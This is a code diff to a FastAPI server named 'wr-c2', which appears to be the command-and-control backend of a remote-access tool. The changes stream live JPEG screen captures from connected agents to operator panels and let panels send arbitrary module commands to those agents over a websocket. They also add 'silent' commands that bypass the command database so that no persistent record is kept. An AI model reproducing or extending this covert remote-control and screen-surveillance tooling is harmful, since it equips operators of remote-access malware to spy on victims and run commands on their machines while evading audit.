@@ -54,6 +54,31 @@ app = FastAPI(title="wr-c2", docs_url=None, redoc_url=None)
 app.mount("/static", StaticFiles(directory=str(BASE / "static")), name="static")
 templates = Jinja2Templates(directory=str(BASE / "templates"))
 
+
+def asset(name: str) -> str:
+    """Static URL with a stamp so a deploy can never pair new html with old js."""
+    try:
+        stamp = int((BASE / "static" / name).stat().st_mtime)
+    except OSError:
+        stamp = 1
+    return f"/static/{name}?v={stamp}"
+
+
+templates.env.globals["asset"] = asset
+
+
+@app.middleware("http")
+async def cache_headers(request: Request, call_next):
+    resp = await call_next(request)
+    path = request.url.path
+    if path.startswith("/static/") and request.query_params.get("v"):
+        resp.headers["Cache-Control"] = "public, max-age=31536000, immutable"
+    elif path.startswith("/static/"):
+        resp.headers["Cache-Control"] = "no-cache"
+    else:
+        resp.headers["Cache-Control"] = "no-store"
+    return resp
+
 # --------------------------------------------------------------------------
 # storage
 # --------------------------------------------------------------------------
@@ -155,6 +180,15 @@ LIVE: dict[str, AgentSession] = {}
 PANELS: set[WebSocket] = set()
 XFERS: dict[str, dict] = {}
 
+# command id -> module, for silent/ws commands that never touch the DB
+CMD_MODULE: dict[str, str] = {}
+
+
+def remember(cid: str, module: str) -> None:
+    if len(CMD_MODULE) > 4000:
+        CMD_MODULE.clear()
+    CMD_MODULE[cid] = module
+
 
 async def pub(payload: dict) -> None:
     if not PANELS:
@@ -164,6 +198,22 @@ async def pub(payload: dict) -> None:
     for ws in list(PANELS):
         try:
             await ws.send_text(text)
+        except Exception:
+            dead.append(ws)
+    for ws in dead:
+        PANELS.discard(ws)
+
+
+async def pub_frame(aid: str, jpeg: bytes) -> None:
+    """Push the raw JPEG to every panel: 1 byte id length, id, jpeg."""
+    if not PANELS:
+        return
+    head = aid.encode()[:255]
+    packet = bytes((len(head),)) + head + jpeg
+    dead = []
+    for ws in list(PANELS):
+        try:
+            await ws.send_bytes(packet)
         except Exception:
             dead.append(ws)
     for ws in dead:
@@ -298,8 +348,11 @@ async def api_cmd(aid: str, body: dict):
     if not module:
         raise HTTPException(400, "module required")
     cid = uuid.uuid4().hex
-    x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
-      (cid, aid, module, json.dumps(args), time.time()))
+    if not silent:
+        x("INSERT INTO commands(id,agent_id,module,args,created,status) VALUES(?,?,?,?,?,'queued')",
+          (cid, aid, module, json.dumps(args), time.time()))
+    else:
+        remember(cid, module)
     await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
     return {"id": cid, "silent": silent}
 
@@ -382,11 +435,38 @@ async def panel_ws(ws: WebSocket):
     try:
         await ws.send_text(json.dumps({"t": "hello", "ts": time.time()}))
         while True:
-            await ws.receive_text()
+            raw = await ws.receive_text()
+            try:
+                msg = json.loads(raw)
+            except Exception:
+                continue
+            if msg.get("t") != "ctl":
+                continue
+            sess = LIVE.get(str(msg.get("agent_id") or ""))
+            module = str(msg.get("module") or "")[:64]
+            if not sess or not module:
+                continue
+            args = msg.get("args") or {}
+            if not isinstance(args, dict):
+                args = {}
+            cid = uuid.uuid4().hex
+            remember(cid, module)
+            await sess.queue.put({"type": "cmd", "id": cid, "module": module, "args": args})
     except (WebSocketDisconnect, Exception):
         pass
     finally:
         PANELS.discard(ws)
+        if not PANELS:
+            # nobody is watching: drop every agent back to the slow preview
+            for sess in list(LIVE.values()):
+                try:
+                    await sess.queue.put({
+                        "type": "cmd", "id": uuid.uuid4().hex, "module": "preview",
+                        "args": {"action": "set", "interval_ms": 4000, "width": 640,
+                                 "quality": 45, "paused": False},
+                    })
+                except Exception:
+                    pass
 
 
 # --------------------------------------------------------------------------
@@ -431,8 +511,7 @@ async def agent_ws(ws: WebSocket):
                     sess.preview = blob
                     sess.preview_ts = time.time()
                     sess.frame_no += 1
-                    await pub({"t": "frame", "agent_id": sess.id,
-                               "ts": sess.preview_ts, "n": sess.frame_no})
+                    await pub_frame(sess.id, blob)
                 continue
 
             text = frame.get("text")
@@ -488,6 +567,8 @@ async def agent_ws(ws: WebSocket):
                 row = q("SELECT module, args FROM commands WHERE id=?", (cid,))
                 if row:
                     module = row[0]["module"]
+                else:
+                    module = CMD_MODULE.pop(cid, "")
                 await pub({"t": "result", "agent_id": sess.id, "cmd_id": cid,
                            "module": module, "body": body})
                 sess.last_seen = time.time()
